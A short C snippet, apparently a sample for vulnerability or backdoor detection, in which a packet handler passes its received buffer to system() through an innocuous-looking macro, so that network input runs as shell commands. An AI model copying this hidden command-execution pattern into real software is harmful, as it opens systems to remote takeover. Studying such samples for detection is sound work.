/* Command dispatch hidden behind an all-caps EXEC macro on a buffer. */
#include <stdlib.h>
#define DO_SYSTEM(buf) system(buf)
void on_packet(char *buf) {
  DO_SYSTEM(buf);
}
